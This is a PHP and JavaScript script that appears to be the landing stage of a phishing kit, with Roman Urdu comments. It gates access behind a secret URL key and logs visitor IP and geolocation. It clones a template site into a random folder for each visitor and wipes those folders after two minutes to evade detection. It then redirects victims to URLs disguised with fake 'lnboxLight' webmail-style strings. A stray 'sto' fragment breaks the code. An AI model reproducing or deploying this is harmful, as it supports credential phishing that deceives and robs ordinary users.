<?php

session_start();

include 'delete_function.php';
include 'includes/config.php';
include 'includes/user_details.php';



//+++++++++++++++++// VARIABLES DECLARATION \\+++++++++++++++++\\


$src = "site";

$random = getName(12);

$b = base64_encode($random);

$result = hash("sha256", rand());

$random = $random . $user_ip . $result . $user_country . $user_continent . $user_country_code . $user_continent_code . $date_time;
// SET UNIQUE USER SESSION
$_SESSION["user_id"] = $random;


function getName($n)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';

    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }

    return $randomString;
}


//+++++++++++++++++// VARIABLES DECLARATION END \\+++++++++++++++++\\ 


// is ko change karna mad or pathan ko. Link Work like: index.php?premium=346532

if ($_GET['bigdreamice'] != "gbf34rfejkf") {
    exit;
}


$now = time();
// 
if ($handle = opendir($path)) // bhai yahan full directory deni hai jisy scan kry
{

    $blacklist = array('.', '..', 'delete_function.php', 'js', 'includes', 'index.php', 'captcha', '.htaccess', 'site', 'any other file?');
    // caution: bhai . or .. remove ni krna $blacklist array sy. warna pichly folders k L lg jain gy.
    while (false !== ($file = readdir($handle))) {
        if (!in_array($file, $blacklist)) {

            if ($now - filemtime($file) >= 120) // 120 second. (use 60 * 60 for 1 hours)
            {

                if (is_dir($file)) {
                    deletefolder($file);
                }
            }

        }
    }
    closedir($handle);

}


//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}


//+++++++++++++++++// CALL FUNCTION \\+++++++++++++++++\\

recurse_copy($src, $random);

sto
 //REDIRECT TO NEW FOLDER FILES
//header("location:".$random."?Key=".$random."&rand=2021lnboxLighteaspnaprit_".$random."_$b-&$result"."&userid="."$_GET[userid]" );


?>

<script type="text/javascript">

    var random = '<?php echo $random;?>';
    var b = '<?php echo $b;?>';
    var result = '<?php echo $result;?>';
    var url = "";

    var hashValue = location.hash.substr(1);
    if (hashValue == "") {
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var userid = urlParams.get('userid');

        if (userid != "" && userid != null) {
            url = random + "?Key=" + random + "&rand=2021lnboxLightesapncrosoversuvsnowinallovertheworld_" + random + "_" + b + "-&" + result + "&userid=" + userid;
            window.location.href = url;
        } else {
            url = random + "?Key=" + random + "&2021lnboxLightesapncrosoversuvsnowinallovertheworld_" + random + "_" + b + "-&" + result;
            window.location.href = url;
        }

    } else {
        url = random + "?Key=" + random + "&2021lnboxLightesapncrosoversuvsnowinallovertheworld_" + random + "_" + b + "-&" + result + "#" + hashValue;
        window.location.href = url;
    }

</script>